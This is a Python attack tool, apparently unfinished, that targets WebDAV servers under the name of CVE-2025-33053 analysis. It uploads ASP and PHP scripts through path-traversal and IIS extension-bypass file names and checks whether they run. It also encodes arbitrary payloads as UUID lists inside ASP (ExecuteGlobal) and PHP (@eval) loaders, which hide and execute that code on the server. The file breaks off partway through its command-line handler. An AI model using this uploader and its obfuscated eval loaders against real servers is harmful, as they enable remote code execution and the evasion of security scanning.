#!/usr/bin/env python3
"""
DAVBest: Comprehensive WebDAV Management and Testing Tool
(CVE-2025-33053 Analysis Capabilities)

This tool combines WebDAV path handling analysis with UUID content
encoding/decoding utilities for security assessments.

SECURITY NOTICE: This tool is for authorized security assessment only.
All actions are logged with timestamps and source information.
"""

import argparse
import base64
import datetime
import hashlib
import json
import logging
import os
import random
import re
import string
import sys
import time
import uuid
from urllib.parse import urlparse

import requests
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, TimeElapsedColumn

# Configure logging with source tracking
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("dav_best.log"), # Changed log file name
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("DAVBest") # Changed logger name

# Rich console for improved terminal output
console = Console()

# --- Start of WebDAVPathAnalyzer (from script 1) ---
class WebDAVPathAnalyzer:
    """Analyzes WebDAV server path handling behaviors."""

    def __init__(self, target_url, auth=None, proxy=None, verify_ssl=True, user_agent=None):
        """
        Initialize the WebDAV path analyzer.

        Args:
            target_url (str): The base URL of the WebDAV server
            auth (tuple, optional): (username, password) for authentication
            proxy (dict, optional): Proxy configuration
            verify_ssl (bool): Whether to verify SSL certificates
            user_agent (str, optional): Custom User-Agent string
        """
        self.target_url = target_url.rstrip('/')
        self.auth = auth
        self.proxies = {"http": proxy, "https": proxy} if proxy else None
        self.verify_ssl = verify_ssl

        # Generate client identifier for logging purposes
        self.client_id = hashlib.sha256(
            f"{os.getpid()}-{time.time()}-{random.randint(1000, 9999)}".encode()
        ).hexdigest()[:12]

        # Set up session with custom headers
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": user_agent or f"DAVBestPathAnalyzer/{self.client_id}", # Updated User-Agent
            "X-Client-ID": self.client_id
        })

        # Create a request history container for analysis
        self.request_history = []

        logger.info(f"Initialized WebDAV analyzer with client ID: {self.client_id}")
        logger.info(f"Target URL: {self.target_url}")

        # Verify WebDAV is enabled
        self._check_webdav_support()

        # Determine target platform
        self.target_platform = self._detect_platform()

        console.print(f"[bold green]Target platform detected: {self.target_platform}[/bold green]")

    def _check_webdav_support(self):
        """Verify target supports WebDAV and allowed methods."""
        try:
            options_resp = self.session.options(
                self.target_url,
                auth=self.auth,
                proxies=self.proxies,
                verify=self.verify_ssl
            )

            self.request_history.append({
                "method": "OPTIONS",
                "url": self.target_url,
                "timestamp": datetime.datetime.now().isoformat(),
                "status_code": options_resp.status_code,
                "headers": dict(options_resp.headers)
            })

            if 'Allow' in options_resp.headers:
                allowed = options_resp.headers['Allow']
                if 'PUT' not in allowed:
                    console.print("[bold red]WARNING: WebDAV PUT method not allowed![/bold red]")
                    logger.warning(f"WebDAV PUT method not allowed. Allowed methods: {allowed}")
                else:
                    console.print(f"[green]WebDAV methods allowed: {allowed}[/green]")

            if 'DAV' in options_resp.headers:
                console.print(f"[green]WebDAV version: {options_resp.headers['DAV']}[/green]")
            else:
                console.print("[yellow]WebDAV header not found, but continuing analysis[/yellow]")

        except Exception as e:
            logger.error(f"Failed to check WebDAV support: {str(e)}")
            console.print(f"[bold red]ERROR: Failed to check WebDAV support: {str(e)}[/bold red]")

    def _detect_platform(self):
        """Attempt to determine the target platform for tailored testing."""
        try:
            resp = self.session.get(
                self.target_url,
                auth=self.auth,
                proxies=self.proxies,
                verify=self.verify_ssl
            )

            headers = resp.headers
            server = headers.get('Server', '').lower()

            if 'microsoft-iis' in server:
                return "IIS"
            elif 'apache' in server:
                return "Apache"
            elif 'nginx' in server:
                return "Nginx"
            else:
                return "Unknown"

        except Exception as e:
            logger.error(f"Platform detection failed: {str(e)}")
            return "Unknown"

    def _create_base_payload_content(self, specific_payload_type_key):
        """
        Internal helper to generate the actual content for basic payloads.
        This avoids recursion in create_test_payload, especially for UUID encoding.

        Args:
            specific_payload_type_key (str): e.g., "info_iis", "info_php", "echo_iis", etc.

        Returns:
            tuple: (payload content, file extension)
        """
        if specific_payload_type_key == "info_iis":
            content = '<%@ Language="VBScript" %>\n'
            content += '<% Response.Write("WebDAV Path Test - System Info (IIS)<br>") %>\n'
            content += '<% Response.Write("Server: " & Request.ServerVariables("SERVER_SOFTWARE") & "<br>") %>\n'
            content += '<% Response.Write("Path: " & Request.ServerVariables("PATH_TRANSLATED") & "<br>") %>\n'
            content += '<% Response.Write("Date: " & Now() & "<br>") %>\n'
            content += '<% Response.Write("Client ID: ' + self.client_id + '") %>'
            return content, "asp"
        elif specific_payload_type_key == "echo_iis":
            content = '<%@ Language="VBScript" %>\n'
            content += '<% Response.Write("Echo Test (IIS): Parameter value is " & Request.QueryString("param")) %>'
            return content, "asp"
        elif specific_payload_type_key == "info_php":
            content = '<?php\n'
            content += 'echo "<h2>WebDAV Path Test - System Info (PHP)</h2>";\n'
            content += 'echo "<p>Server: " . (isset($_SERVER["SERVER_SOFTWARE"]) ? $_SERVER["SERVER_SOFTWARE"] : "N/A") . "</p>";\n'
            content += 'echo "<p>Path: " . __FILE__ . "</p>";\n'
            content += 'echo "<p>Date: " . date("Y-m-d H:i:s") . "</p>";\n'
            content += 'echo "<p>Client ID: ' + self.client_id + '</p>";\n'
            content += '?>'
            return content, "php"
        elif specific_payload_type_key == "echo_php":
            content = '<?php\n'
            content += 'echo "Echo Test (PHP): Parameter value is " . htmlspecialchars(isset($_GET["param"]) ? $_GET["param"] : "");\n'
            content += '?>'
            return content, "php"
        elif specific_payload_type_key == "info_txt": # Generic for unknown or non-scriptable
            return f"WebDAV Path Test - System Info (Text)\nClient ID: {self.client_id}\nTimestamp: {time.time()}", "txt"
        elif specific_payload_type_key == "echo_txt": # Generic for unknown or non-scriptable
            return f"WebDAV Path Test - Echo (Text)\nClient ID: {self.client_id}\nParam: [Not Executed]", "txt"

        # Fallback internal error
        logger.error(f"Internal error: _create_base_payload_content called with unknown type '{specific_payload_type_key}'")
        return f"Error: Unknown base payload type '{specific_payload_type_key}'", "txt"

    def create_test_payload(self, payload_type="info"):
        """
        Generate test payload for path handling verification.

        Args:
            payload_type (str): Type of payload to generate
                - "info": Simple system information display script
                - "echo": Echo testing script
                - "uuid": UUID-based encoded content

        Returns:
            tuple: (payload content, file extension)
        """
        if payload_type == "uuid":
            base_script_content = ""
            base_payload_key_suffix = "" # To determine if we need _iis, _php, or _txt for the base script

            if self.target_platform == "IIS":
                base_payload_key_suffix = "_iis"
            elif self.target_platform in ["Apache", "Nginx"]:
                base_payload_key_suffix = "_php"
            else: # Unknown platform
                base_payload_key_suffix = "_txt"

            # We'll encode the "info" payload by default for UUID wrapping
            base_script_content, _ = self._create_base_payload_content(f"info{base_payload_key_suffix}")

            encoder = UuidEncoder()
            uuids = encoder.encode_to_uuids(base_script_content)
            logger.info(f"Encoded base script for UUID payload ({len(base_script_content)} bytes) into {len(uuids)} UUIDs for {self.target_platform} platform.")

            if self.target_platform == "IIS":
                final_content = encoder.generate_vbscript_decoder(uuids)
                return final_content, "asp"
            elif self.target_platform in ["Apache", "Nginx"]:
                final_content = encoder.generate_php_decoder(uuids)
                return final_content, "php"
            else: # Unknown platform, UUIDs will be in a .txt file
                logger.warning(f"UUID payload selected for platform '{self.target_platform}', but no specific script wrapper (ASP/PHP). Defaulting to raw UUID list within a text file.")
                return "\n".join(uuids), "txt"

        # Handle non-UUID payload types
        if self.target_platform == "IIS":
            if payload_type == "info":
                return self._create_base_payload_content("info_iis")
            elif payload_type == "echo":
                return self._create_base_payload_content("echo_iis")
        elif self.target_platform == "Apache" or self.target_platform == "Nginx":
            if payload_type == "info":
                return self._create_base_payload_content("info_php")
            elif payload_type == "echo":
                return self._create_base_payload_content("echo_php")

        # Default/fallback for "info" or "echo" on unknown platforms or unhandled combinations
        if payload_type == "info":
             return self._create_base_payload_content("info_txt")
        elif payload_type == "echo":
             return self._create_base_payload_content("echo_txt")

        # Fallback for any truly unhandled combination
        logger.warning(f"Unhandled payload type '{payload_type}' for platform '{self.target_platform}'. Returning generic text payload.")
        return f"WebDAV Path Test - Generic Payload\nClient ID: {self.client_id}\nTimestamp: {time.time()}", "txt"

    def generate_test_paths(self):
        """
        Generate test paths for checking path validation behaviors.

        Returns:
            list: List of paths to test
        """
        paths = []

        # Base path
        paths.append("test_file")

        # Basic traversal patterns
        paths.append("../test_file")
        paths.append("../../test_file")

        # Double encoding
        paths.append("%252e%252e/test_file")  # Double-encoded ../

        # Platform-specific paths
        if self.target_platform == "IIS":
            paths.append("test_file.asp;.txt")
            paths.append("test_file.asp::$DATA")
            paths.append("test..file.asp")

        # Path normalization tests
        paths.append("./test_file")
        paths.append("test_file/.")
        paths.append("test_file/./")

        # Backslash variants (Windows)
        if self.target_platform in ["IIS", "Unknown"]:
            paths.append("test_file\\")
            paths.append("..\\test_file")

        # Unicode normalization
        paths.append("test\u2024file")  # Unicode dot

        # URL encoding variations
        paths.append("test%5ffile")  # Encoded underscore
        paths.append("test%20file")  # Space

        # Add unique client ID to avoid collision with other testers
        return [f"{self.client_id}_{path}" for path in paths]

    def test_path(self, base_path, test_path, payload_type="info"):
        """
        Test a specific path for validation behavior.

        Args:
            base_path (str): Base directory on WebDAV server
            test_path (str): Path to test
            payload_type (str): Type of payload to use

        Returns:
            dict: Test results
        """
        full_path_orig = f"{self.target_url}/{base_path.strip('/')}/{test_path.lstrip('/')}"
        # Normalize multiple slashes, but not the ones in protocol (http://)
        parsed_target_url = urlparse(self.target_url)
        normalized_path_part = os.path.normpath(f"/{base_path.strip('/')}/{test_path.lstrip('/')}").lstrip('/')
        full_path = f"{parsed_target_url.scheme}://{parsed_target_url.netloc}/{normalized_path_part}"


        safe_path = re.sub(r'[^a-zA-Z0-9._-]', '_', test_path)

        console.print(f"[bold blue]Testing path:[/bold blue] {test_path}")
        logger.info(f"Testing path: {test_path} (Full URL: {full_path})")

        # Create test file content
        content, extension = self.create_test_payload(payload_type)

        # Ensure the test_path ends with the correct extension for the payload
        # This might involve replacing an existing extension or appending one.
        path_name_part, path_ext_part = os.path.splitext(test_path)
        if path_ext_part.lower() != f".{extension.lower()}":
             # If there's an existing extension and it's different, replace it.
             # If no extension, or if it's part of a complex segment (e.g. .asp;.txt), append.
             # For simplicity in this step, we'll append/replace based on simple split.
             # A more robust solution might be needed for complex cases like "file.asp;.txt"
             # if the intention is to make it "file.asp;.php"
            if payload_type == "uuid" and (self.target_platform == "IIS" and path_name_part.endswith(".asp") or \
                                           (self.target_platform == "Apache" or self.target_platform == "Nginx") and path_name_part.endswith(".php")):
                # If it's a UUID payload and the base path already has the correct script ext, don't append another.
                # e.g., test_file.asp should remain test_file.asp for UUID ASP payload.
                pass # Extension is already suitable
            elif any(test_path.endswith(known_ext) for known_ext in [".asp", ".php", ".txt"]) and \
                 not test_path.endswith(f".{extension}"):
                # If it ends with a known payload extension that is NOT the current one,
                # we assume the user wants to test *that specific file type* with the payload logic.
                # Example: testing "test_file.asp" with payload_type "uuid" (which generates .asp for IIS)
                # In this case, the path is already what we want.
                # However, if testing "test_file.txt" with payload_type "info" for IIS (which generates .asp),
                # it should become "test_file.txt.asp" or similar based on server behavior.
                # The current logic appends, which is a common strategy.
                # The CVE might involve specific behaviors with double extensions.
                # For now, we ensure the *final* extension matches the payload.
                path_name_part, _ = os.path.splitext(test_path)
                test_path = f"{path_name_part}.{extension}"

            elif not test_path.endswith(f".{extension}"):
                 test_path = f"{test_path}.{extension}"

        # Reconstruct full_path with potentially modified test_path
        normalized_path_part = os.path.normpath(f"/{base_path.strip('/')}/{test_path.lstrip('/')}").lstrip('/')
        full_path = f"{parsed_target_url.scheme}://{parsed_target_url.netloc}/{normalized_path_part}"


        result = {
            "test_path": test_path,
            "full_url": full_path,
            "timestamp": datetime.datetime.now().isoformat(),
            "payload_type": payload_type,
            "success": False,
            "put_status": None,
            "get_status": None,
            "delete_status": None,
            "platform": self.target_platform,
            "client_id": self.client_id
        }

        try:
            # PUT the test file
            put_resp = self.session.put(
                full_path,
                auth=self.auth,
                proxies=self.proxies,
                verify=self.verify_ssl,
                data=content.encode('utf-8') # Ensure content is bytes
            )

            result["put_status"] = put_resp.status_code
            result["put_headers"] = dict(put_resp.headers)

            self.request_history.append({
                "method": "PUT",
                "url": full_path,
                "timestamp": datetime.datetime.now().isoformat(),
                "status_code": put_resp.status_code,
                "headers": dict(put_resp.headers)
            })

            # Check if PUT was successful
            if put_resp.status_code in [200, 201, 204]:
                console.print(f"  [green]PUT successful: {put_resp.status_code}[/green]")
                time.sleep(1)  # Brief pause for server processing

                # Try to GET the file to verify it was placed correctly
                get_resp = self.session.get(
                    full_path,
                    auth=self.auth,
                    proxies=self.proxies,
                    verify=self.verify_ssl
                )

                result["get_status"] = get_resp.status_code
                result["get_headers"] = dict(get_resp.headers)

                self.request_history.append({
                    "method": "GET",
                    "url": full_path,
                    "timestamp": datetime.datetime.now().isoformat(),
                    "status_code": get_resp.status_code,
                    "headers": dict(get_resp.headers)
                })

                if get_resp.status_code == 200:
                    result["success"] = True
                    # Ensure content comparison handles potential encoding differences
                    # For simplicity, we'll check if the core part of the payload is present.
                    # A more robust check might involve decoding server response if it's different.
                    if payload_type == "uuid": # For UUID, the executed content matters
                        # This is tricky as the GET response will be the *executed* script output.
                        # We're looking for evidence the script ran, e.g., Client ID.
                        result["content_match"] = self.client_id in get_resp.text
                    else:
                        result["content_match"] = content in get_resp.text

                    console.print(f"  [green]GET successful: {get_resp.status_code}[/green]")
                    console.print(f"  [green]Content verification (presence of key elements): {result['content_match']}[/green]")
                else:
                    console.print(f"  [yellow]GET failed: {get_resp.status_code}[/yellow]")

                # Try to DELETE the file
                delete_resp = self.session.delete(
                    full_path,
                    auth=self.auth,
                    proxies=self.proxies,
                    verify=self.verify_ssl
                )

                result["delete_status"] = delete_resp.status_code
                result["delete_headers"] = dict(delete_resp.headers)

                self.request_history.append({
                    "method": "DELETE",
                    "url": full_path,
                    "timestamp": datetime.datetime.now().isoformat(),
                    "status_code": delete_resp.status_code,
                    "headers": dict(delete_resp.headers)
                })

                if delete_resp.status_code in [200, 202, 204]:
                    console.print(f"  [green]DELETE successful: {delete_resp.status_code}[/green]")
                else:
                    console.print(f"  [yellow]DELETE failed: {delete_resp.status_code}[/yellow]")
            else:
                console.print(f"  [yellow]PUT failed: {put_resp.status_code}[/yellow]")

        except requests.exceptions.RequestException as e: # More specific exception
            logger.error(f"Request error testing path {test_path}: {str(e)}")
            console.print(f"  [bold red]Request Error: {str(e)}[/bold red]")
            result["error"] = str(e)
        except Exception as e:
            logger.error(f"Error testing path {test_path}: {str(e)}")
            console.print(f"  [bold red]Error: {str(e)}[/bold red]")
            result["error"] = str(e)

        return result

    def run_comprehensive_test(self, base_path, payload_types=None):
        """
        Run a comprehensive set of path handling tests.

        Args:
            base_path (str): Base directory on WebDAV server
            payload_types (list): Types of payloads to test

        Returns:
            dict: Comprehensive test results
        """
        if payload_types is None:
            payload_types = ["info"]

        test_paths = self.generate_test_paths()
        results = []

        console.print(f"\n[bold cyan]Starting comprehensive WebDAV path handling analysis[/bold cyan]")
        console.print(f"[bold cyan]Target: {self.target_url}/{base_path}[/bold cyan]")
        console.print(f"[bold cyan]Platform: {self.target_platform}[/bold cyan]")
        console.print(f"[bold cyan]Test paths: {len(test_paths)}[/bold cyan]")
        console.print(f"[bold cyan]Payload types: {', '.join(payload_types)}[/bold cyan]\n")

        with Progress(
            SpinnerColumn(),
            TextColumn("[bold blue]{task.description}"),
            TimeElapsedColumn(),
            console=console
        ) as progress:
            task_description = "[bold blue]Testing paths..." # progress.settings.description is not directly settable
            task = progress.add_task(description=task_description, total=len(test_paths) * len(payload_types))

            for test_path_template in test_paths:
                for payload_type in payload_types:
                    # Update task description to show current path and payload
                    current_task_desc = f"Testing: {test_path_template} ({payload_type})"
                    progress.update(task, description=current_task_desc)

                    result = self.test_path(base_path, test_path_template, payload_type)
                    results.append(result)
                    progress.advance(task)
            progress.update(task, description="[bold green]Path testing complete![/bold green]")


        # Save results to file with timestamp
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"dav_best_analysis_{timestamp}_{self.client_id}.json" # Changed filename

        with open(filename, 'w') as f:
            json.dump({
                "target": self.target_url,
                "base_path": base_path,
                "platform": self.target_platform,
                "client_id": self.client_id,
                "timestamp": datetime.datetime.now().isoformat(),
                "results": results,
                "request_history": self.request_history
            }, f, indent=2)

        console.print(f"\n[bold green]Analysis complete! Results saved to {filename}[/bold green]")

        # Print summary
        successful_tests = [r for r in results if r.get("success")] # Use .get for safety
        console.print(f"\n[bold cyan]Summary:[/bold cyan]")
        console.print(f"Total tests: {len(results)}")
        console.print(f"Successful tests (PUT and GET OK): {len(successful_tests)}")

        if successful_tests:
            console.print("\n[bold yellow]Paths with successful PUT & GET:[/bold yellow]")
            for result in successful_tests:
                console.print(f"  • {result['test_path']} ({result['payload_type']}) - Content Match: {result.get('content_match', 'N/A')}")

        return {
            "total_tests": len(results),
            "successful_tests": len(successful_tests),
            "results": results,
            "output_file": filename
        }
# --- End of WebDAVPathAnalyzer ---


# --- Start of UuidEncoder (from script 2) ---
class UuidEncoder:
    """Encodes and decodes content using UUID representation."""

    @staticmethod
    def encode_to_uuids(content, chunk_size=16):
        """
        Encode content into a list of UUIDs.

        Args:
            content (str or bytes): Content to encode
            chunk_size (int): Size of each chunk (max 16 bytes for UUID)

        Returns:
            list: List of UUID strings
        """
        if chunk_size > 16 or chunk_size <=0:
            raise ValueError("Chunk size must be between 1 and 16 for UUID encoding.")

        if isinstance(content, str):
            content = content.encode('utf-8')

        uuid_list = []

        for i in range(0, len(content), chunk_size):
            # Get chunk based on chunk_size
            raw_chunk = content[i:i+chunk_size]

            # Prepare a 16-byte chunk for UUID creation, padding if necessary
            uuid_bytes_chunk = bytearray(16) # Initialize with 16 null bytes
            uuid_bytes_chunk[:len(raw_chunk)] = raw_chunk # Copy content

            # Create UUID from the 16-byte chunk
            u = uuid.UUID(bytes=bytes(uuid_bytes_chunk))
            uuid_list.append(str(u))

        return uuid_list

    @staticmethod
    def decode_from_uuids(uuid_list, strip_null_padding=True):
        """
        Decode content from a list of UUIDs.

        Args:
            uuid_list (list): List of UUID strings
            strip_null_padding (bool): Whether to strip trailing null bytes from the final decoded content.

        Returns:
            bytes: Decoded content
        """
        all_bytes_chunks = []

        for u_str in uuid_list:
            # Parse UUID to bytes
            try:
                bytes_data = uuid.UUID(u_str).bytes
                all_bytes_chunks.append(bytes_data)
            except ValueError as e:
                logger.error(f"Invalid UUID string encountered during decoding: {u_str} - {e}")
                raise # Re-raise after logging

        content = b''.join(all_bytes_chunks)

        if strip_null_padding:
            # This needs to be careful: only strip padding that was added by the encoder.
            # The original content might have had null bytes.
            # The current encoding always pads the *last* chunk if it's smaller than chunk_size.
            # A more robust way would be to store original length if perfect reconstruction is needed.
            # This was the original logic from script 2: rstrip nulls from each 16-byte segment.
            # This is intended to remove padding nulls added to make a sub-segment 16 bytes.
            # It's not about stripping nulls from the *final combined content* unless that's what the user wants.
            # The PHP/ASP decoders also have their own final null stripping logic for the evaluated script.

            # The issue is, if original sub-segment was < 16 bytes AND ended in a legit null, rstrip is too aggressive.
            # However, for typical text payloads that are encoded, this is usually what's desired.
            # Given the current structure, the most straightforward way to "remove padding" is rstrip on each 16B segment.
            # A more complex system would store original chunk lengths.
             all_trimmed_chunks = []
             for u_str in uuid_list:
                try:
                    bytes_data = uuid.UUID(u_str).bytes
                    if strip_null_padding: # Process each chunk if stripping
                        bytes_data = bytes_data.rstrip(b'\x00')
                    all_trimmed_chunks.append(bytes_data)
                except ValueError as e:
                    logger.error(f"Invalid UUID string encountered during decoding: {u_str} - {e}")
                    raise
             return b''.join(all_trimmed_chunks)

        # If not stripping padding, just join the raw 16-byte chunks.
        # This path was taken if strip_null_padding=False
        # The previous code had 'content = b''.join(all_bytes_chunks)' which was populated earlier.
        # Let's make it explicit:
        if not strip_null_padding:
            all_raw_chunks = []
            for u_str in uuid_list:
                try:
                    all_raw_chunks.append(uuid.UUID(u_str).bytes)
                except ValueError as e:
                    logger.error(f"Invalid UUID string encountered during decoding: {u_str} - {e}")
                    raise
            return b''.join(all_raw_chunks)

        # Fallback, though one of the above should always execute.
        return b""


    @staticmethod
    def generate_vbscript_decoder(uuid_list):
        """
        Generate VBScript code to decode content from UUIDs.

        Args:
            uuid_list (list): List of UUID strings

        Returns:
            str: VBScript decoder code
        """
        script = '<%@ Language="VBScript" %>\n'
        script += '<% \n'
        script += f"uuids = Array({', '.join([f'\"' + u + '\"' for u in uuid_list])})\n"

        script += 'Function UuidToBytes(uuidStr)\n'
        script += '    Dim re, matches, bytesStr, resultBytes(), i, part\n' # Changed 'bytes' to 'resultBytes'
        script += '    Set re = New RegExp\n'
        script += '    re.Pattern = "([0-9a-f]{8})-([0-9a-f]{4})-([0-9a-f]{4})-([0-9a-f]{4})-([0-9a-f]{12})"\n'
        script += '    re.IgnoreCase = True\n'
        script += '    Set matches = re.Execute(uuidStr)\n'
        script += '    If matches.Count > 0 Then\n'
        script += '        Set m = matches(0)\n'
        script += '        bytesStr = m.SubMatches(0) & m.SubMatches(1) & m.SubMatches(2) & m.SubMatches(3) & m.SubMatches(4)\n'
        script += '        ReDim resultBytes(Len(bytesStr)/2 - 1)\n'
        script += '        For i = 0 To UBound(resultBytes)\n'
        script += '            part = Mid(bytesStr, i*2+1, 2)\n'
        script += '            If Len(part) = 2 Then resultBytes(i) = CByte("&H" & part)\n'
        script += '        Next\n'
        script += '        UuidToBytes = resultBytes\n'
        script += '    Else\n'
        script += '        UuidToBytes = Array()\n' # Handle no match
        script += '    End If\n'
        script += 'End Function\n'

        script += 'Dim allBytes(), bytesIndex, u, currentBytes, b\n' # Declare all variables
        script += 'ReDim allBytes(0)\n' # Initialize as dynamic array
        script += 'bytesIndex = 0\n'
        script += 'For Each u in uuids\n'
        script += '    currentBytes = UuidToBytes(u)\n'
        script += '    If IsArray(currentBytes) And UBound(currentBytes) >= 0 Then\n' # Check if array is not empty
        script += '        For Each b in currentBytes\n'
        script += '            If bytesIndex > UBound(allBytes) Then ReDim Preserve allBytes(bytesIndex)\n'
        script += '            allBytes(bytesIndex) = b\n'
        script += '            bytesIndex = bytesIndex + 1\n'
        script += '        Next\n'
        script += '    End If\n'
        script += 'Next\n'

        # Trim the array to actual size if it was overallocated
        script += 'If bytesIndex > 0 Then ReDim Preserve allBytes(bytesIndex - 1)\n'


        script += 'Dim finalScript\n' # Changed 'script' to 'finalScript'
        script += 'finalScript = ""\n'
        script += 'If bytesIndex > 0 Then\n' # Check if allBytes has elements
        script += '    For Each b in allBytes\n'
        # Ensure 'b' is not empty or null before Chr(), though CByte should prevent this.
        # VBScript Chr(0) can be problematic or act as a terminator.
        # The original script filtered b > 0. Let's keep that for avoiding nulls in the script string itself.
        script += '        If IsNumeric(b) And b > 0 And b <= 255 Then finalScript = finalScript & Chr(b)\n'
        script += '    Next\n'
        script += 'End If\n'

        script += 'If Len(finalScript) > 0 Then ExecuteGlobal finalScript\n' # Use ExecuteGlobal for broader scope
        script += '%>'

        return script

    @staticmethod
    def generate_php_decoder(uuid_list):
        """
        Generate PHP code to decode content from UUIDs.

        Args:
            uuid_list (list): List of UUID strings

        Returns:
            str: PHP decoder code
        """
        script = '<?php\n'
        script += 'error_reporting(0); // Suppress errors for cleaner output if something minor goes wrong during decoding\n'
        script += 'function uuidToBytes($uuid) {\n'
        script += '    $uuidClean = str_replace("-", "", $uuid);\n'
        script += '    $bytes = "";\n'
        script += '    if (strlen($uuidClean) % 2 !== 0) { return ""; } // Invalid hex string\n'
        script += '    for ($i = 0; $i < strlen($uuidClean); $i += 2) {\n'
        script += '        $hexPair = substr($uuidClean, $i, 2);\n'
        script += '        if (!ctype_xdigit($hexPair)) { return ""; } // Invalid hex char\n'
        script += '        $bytes .= chr(hexdec($hexPair));\n'
        script += '    }\n'
        script += '    return $bytes;\n'
        script += '}\n\n'

        script += '$uuids = array(\n'
        for u in uuid_list:
            script += f'    "{u}",\n' # Ensure UUIDs are properly quoted
        script += ');\n\n'

        script += '$decodedScript = "";\n' # Changed '$script' to '$decodedScript'
        script += 'foreach ($uuids as $uuid) {\n'
        script += '    $bytes = uuidToBytes($uuid);\n'
        script += '    $decodedScript .= $bytes;\n'
        script += '}\n\n'

        # Remove trailing null bytes that might have been added for padding ONLY from the very end.
        # This is to prevent premature termination of the script if it contains legitimate nulls.
        # The original script's preg_replace("/\\x00+$/", "", $script) was correct for this.
        script += '$decodedScript = preg_replace("/\\x00+$/", "", $decodedScript);\n'

        # Use @eval to suppress errors from eval itself if the decoded script is malformed
        script += 'if (!empty($decodedScript)) { @eval($decodedScript); }\n'
        script += '?>'

        return script
# --- End of UuidEncoder ---


# --- Main CLI handler (to be implemented in Step 2) ---
def main_cli():
    parser = argparse.ArgumentParser(
        description="DAVBest: WebDAV Management and Testing Tool (CVE-2025-33053)",
        formatter_class=argparse.RawTextHelpFormatter, # For better help text formatting
        epilog="""\
Example Usage:
  Analyze WebDAV paths:
    python dav_best.py analyze -t http://localhost/webdav -d testfiles --payload info
    python dav_best.py analyze -t https://example.com/dav --username user --password pass -d files --payload uuid

  Encode content to UUIDs:
    python dav_best.py encode-uuid -i input.txt -o output.uuid.txt
    cat payload.php | python dav_best.py encode-uuid --type php -o encoded_payload.php

  Decode UUIDs to content:
    python dav_best.py decode-uuid -i output.uuid.txt -o original.txt
    cat encoded_payload.php | python dav_best.py decode-uuid --type php # (Note: this won't work directly, need to extract UUIDs first)

Please report issues or contribute at <Your Project Repository URL>
"""
    )
    subparsers = parser.add_subparsers(dest="command", help="Available commands", required=True)

    # --- Analyzer Subparser ---
    analyze_parser = subparsers.add_parser("analyze", help="Analyze WebDAV server path handling")
    analyze_parser.add_argument("-t", "--target", required=True, help="Target WebDAV server URL")
    analyze_parser.add_argument("-d", "--directory", default="davbest_tests", help="Base WebDAV directory for tests (will be created if possible)")
    analyze_parser.add_argument("-u", "--username", help="WebDAV username")
    analyze_parser.add_argument("-p", "--password", help="WebDAV password")
    analyze_parser.add_argument("--proxy", help="HTTP/HTTPS proxy URL (e.g., http://127.0.0.1:8080)")
    analyze_parser.add_argument("--no-verify-ssl", action="store_true", help="Disable SSL certificate verification")
    analyze_parser.add_argument("--user-agent", help="Custom User-Agent string")
    analyze_parser.add_argument("--payload", choices=["info", "echo", "uuid", "all"],
                                default="info", help="Payload type(s) to use for testing. 'all' tests info, echo, and uuid.")

    # --- UUID Encoder Subparser ---
    encode_parser = subparsers.add_parser("encode-uuid", help="Encode content to UUIDs or UUID-based scripts")
    encode_parser.add_argument("-i", "--input", help="Input file path (reads from stdin if not specified)")
    encode_parser.add_argument("-o", "--output", help="Output file path (writes to stdout if not specified)")
    encode_parser.add_argument("--type", choices=["asp", "php", "raw"], default="raw",
                               help="Output type: 'raw' for list of UUIDs, 'asp'/'php' for decoder script.")
    encode_parser.add_argument("--chunk-size", type=int, default=16, help="Chunk size for UUID encoding (1-16 bytes). Default: 16")


    # --- UUID Decoder Subparser ---
    decode_parser = subparsers.add_parser("decode-uuid", help="Decode UUIDs back to original content")
    decode_parser.add_argument("-i", "--input", help="Input file path with UUIDs (reads from stdin if not specified)")
    decode_parser.add_argument("-o", "--output", help="Output file path for decoded content (writes to stdout if not specified)")
    # decode_parser.add_argument("--type", choices=["asp", "php", "raw"], default="raw",
                            #    help="Input type if it's an ASP/PHP script. 'raw' assumes direct list of UUIDs. (Future feature)")


    args = parser.parse_args()

    # Banner
    console.print("\n[bold cyan]===============================================================[/bold cyan]")
    console.print("[bold cyan]    DAVBest: WebDAV Management and Testing Tool             [/bold cyan]")
    console.print("[bold cyan]===============================================================[/bold cyan]")
    if args.command == "analyze":
        console.print("[yellow]NOTICE: Path analysis is for authorized security testing only.[/yellow]")
        console.print("[yellow]All actions are logged with source information.[/yellow]\n")


    try:
        if args.command == "analyze":
            auth = (args.username, args.password) if args.username and args.password else None
            analyzer = WebDAVPathAnalyzer(
                args.target,
                auth=auth,
                proxy=args.proxy,
                verify_ssl=not args.no_verify_ssl,
                user_agent=args.user_agent
            )
            payload_types = ["info", "echo", "uuid"] if args.payload == "all" else [args.payload]
            analyzer.run_comprehensive_test(args.directory, payload_types)

        elif args.command == "encode-uuid":
            encoder = UuidEncoder()
            content = b""
            if args.input:
                with open(args.input, 'rb') as f:
                    content = f.read()
            else:
                if sys.stdin.isatty():
                    console.print("[yellow]No input file specified and no data from stdin. Waiting for stdin input (Ctrl+D to end)...[/yellow]")
                content = sys.stdin.buffer.read()

            if not content:
                console.print("[bold red]Error: No input content provided for encoding.[/bold red]")
                sys.exit(1)

            try:
                if not (1 <= args.chunk_size <= 16):
                    raise ValueError("Chunk size must be between 1 and 16.")
                uuid_list = encoder.encode_to_uuids(content, chunk_size=args.chunk_size)
            except ValueError as ve:
                console.print(f"[bold red]Encoding Error: {ve}[/bold red]")
                sys.exit(1)

            console.print(f"[green]Encoded {len(content)} bytes into {len(uuid_list)} UUIDs (chunk size: {args.chunk_size})[/green]")

            output_data = ""
            if args.type == "asp":
                output_data = encoder.generate_vbscript_decoder(uuid_list)
            elif args.type == "php":
                output_data = encoder.generate_php_decoder(uuid_list)
            else:  # raw
                output_data = "\n".join(uuid_list)

            if args.output:
                with open(args.output, 'w', encoding='utf-8') as f: # Ensure utf-8 for scripts
                    f.write(output_data)
                console.print(f"[green]Output written to {args.output}[/green]")
            else:
                print(output_data)

        elif args.command == "decode-uuid":
            encoder = UuidEncoder() # UuidEncoder is a class with static methods, instantiation not strictly needed here
            uuid_input_str = ""
            if args.input:
                with open(args.input, 'r', encoding='utf-8') as f:
                    uuid_input_str = f.read()
            else:
                if sys.stdin.isatty():
